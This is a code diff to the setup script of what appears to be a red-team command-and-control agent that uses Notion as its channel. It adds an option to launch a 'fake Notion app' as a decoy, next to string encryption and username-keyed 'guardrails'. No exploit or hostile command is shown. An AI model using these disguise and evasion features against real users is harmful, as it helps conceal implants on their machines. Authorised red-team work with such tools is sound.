@@ -120,6 +120,12 @@ def take_in_vars():
         important + "Enter the key to use to encrypt your agent's strings [default is 'offensivenotion']", "offensivenotion")
     print(good + "Encryption key: {}".format(litcrypt_key))
 
+    # Launch App
+    launch_app = ask_for_input(
+        important + "Launch fake Notion app (Windows/Linux only) (y/N)?", "false")
+    launch_app = "true" if launch_app == "y" else "false"
+    print(good + "Launch App: {}".format(launch_app))
+
     print(important + "Guardrails!")
     env_checks = []
     key_username = ask_for_input(important + "Enter a username to key off. [Leave blank for no keying to username]", "")
@@ -140,7 +146,8 @@ def take_in_vars():
         "API_KEY": api_key,
         "PARENT_PAGE_ID": parent_page_id,
         "LOG_LEVEL": str(log_level),
-        "LITCRYPT_KEY": litcrypt_key,\
+        "LITCRYPT_KEY": litcrypt_key,
+        "LAUNCH_APP": launch_app,
         # "[{\"Username\": \"husky\"}]"
         "ENV_CHECKS": env_checks
     }
